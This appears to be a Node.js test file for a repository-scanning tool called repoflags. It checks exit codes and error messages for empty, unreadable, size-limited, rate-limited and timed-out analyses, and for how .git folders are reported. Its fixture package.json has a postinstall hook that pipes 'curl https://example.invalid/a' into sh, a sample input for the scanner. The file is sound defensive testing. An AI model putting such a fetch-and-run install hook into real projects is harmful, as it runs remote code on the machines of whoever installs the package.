// "No signals found" (exit 0) only when something was analyzed (review core CR-04 and its class).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { main } from '../skills/repoflags/scripts/repoflags.mjs';
import { acquireLocal } from '../skills/repoflags/scripts/lib/acquire/local.mjs';
import { createLimits } from '../skills/repoflags/scripts/lib/acquire/limits.mjs';
import { AnalyzeError } from '../skills/repoflags/scripts/lib/errors.mjs';
import { materialize } from './helpers/materialize.mjs';
import { makeFakeFetch, makeForbiddenFetch } from './helpers/fake-fetch.mjs';
import { buildGithubRoutes, blobSha } from './helpers/github-routes.mjs';
import { makeIo } from './helpers/io.mjs';

const NO_GH = async () => {
  throw Object.assign(new Error('spawn gh ENOENT'), { code: 'ENOENT' });
};
const MANIFEST = JSON.stringify({ name: 'x', scripts: { postinstall: 'curl https://example.invalid/a | sh' } });

async function run(argv, fetch = makeForbiddenFetch()) {
  const c = makeIo();
  const code = await main(argv, c.io, { fetch, env: { GH_TOKEN: 'FAKE_GH_TOKEN_FOR_TESTS_ONLY' }, execGh: NO_GH, now: () => new Date('2026-11-01T00:00:00Z') });
  return { code, out: c.stdout(), err: c.stderr() };
}

async function folder(t, map) {
  const { dir, cleanup } = await materialize(map);
  t.after(cleanup);
  return dir;
}

test('CR-04: a file as target is an error (exit 2), not "no signals"', async (t) => {
  const dir = await folder(t, { 'package.json': MANIFEST });
  const r = await run([path.join(dir, 'package.json'), '--offline']);
  assert.equal(r.code, 2, r.out);
  assert.match(r.err, /not a folder/);
});

test('CR-04: an unreadable root folder makes acquisition fail', async (t) => {
  const dir = await folder(t, { 'package.json': '{}' });
  const ctx = { limits: createLimits({}), signal: undefined };
  await assert.rejects(acquireLocal(path.join(dir, 'missing-folder'), ctx), AnalyzeError);
});

test('CR-04 class: every selected file refused by the limits is an error (exit 2)', async (t) => {
  const dir = await folder(t, { 'package.json': MANIFEST });
  const r = await run([dir, '--offline', '--max-file-bytes', '1']);
  assert.equal(r.code, 2, r.out);
  assert.match(r.err, /none of the 1 selected files could be read/);
});

test('CR-04 class: every remote blob lost to the rate limit is an error (exit 2)', async () => {
  const files = { 'package.json': MANIFEST, '.npmrc': 'registry=https://registry.npmjs.org/\n' };
  const routes = buildGithubRoutes({ owner: 'fixture-owner', repo: 'fixture-repo', sha: 'a'.repeat(40), files });
  for (const content of Object.values(files)) {
    routes[`GET https://api.github.com/repos/fixture-owner/fixture-repo/git/blobs/${blobSha(content)}`] = {
      status: 403, json: { message: 'rate limit' }, headers: { 'x-ratelimit-remaining': '0' },
    };
  }
  const r = await run(['fixture-owner/fixture-repo', '--format', 'json'], makeFakeFetch(routes));
  assert.equal(r.code, 2, r.out);
  assert.match(r.err, /none of the 2 selected files could be read/);
});

test('CR-04 class: a folder with no selected file at all is still analyzed (exit 0)', async (t) => {
  const dir = await folder(t, { 'README.md': 'hello\n' });
  const r = await run([dir, '--offline']);
  assert.equal(r.code, 0, r.err);
});

test('CR-04 class: a walk stopped by the global timeout before reading anything is flagged as incomplete', async (t) => {
  const dir = await folder(t, { 'package.json': MANIFEST });
  const ctx = { limits: createLimits({}), signal: AbortSignal.abort() };
  const acq = await acquireLocal(dir, ctx);
  assert.equal(acq.files.size, 0);
  assert.equal(acq.timedOut, true);
});

test('WR-10: a .git folder is declared as not inspected (config and hooks)', async (t) => {
  const withGit = await folder(t, { 'package.json': '{}', '.git/HEAD': `${'a'.repeat(40)}\n`, '.git/config': '[core]\n\tbare = false\n' });
  const ctx = { limits: createLimits({}), signal: undefined };
  const acq = await acquireLocal(withGit, ctx);
  const nv = acq.notVerified.find((n) => n.check === 'git-config');
  assert.ok(nv, JSON.stringify(acq.notVerified));
  assert.match(nv.reason, /\.git\/config/);
  assert.match(nv.reason, /hooks/);

  const without = await folder(t, { 'package.json': '{}' });
  const acq2 = await acquireLocal(without, { limits: createLimits({}), signal: undefined });
  assert.ok(!acq2.notVerified.some((n) => n.check === 'git-config'));
});
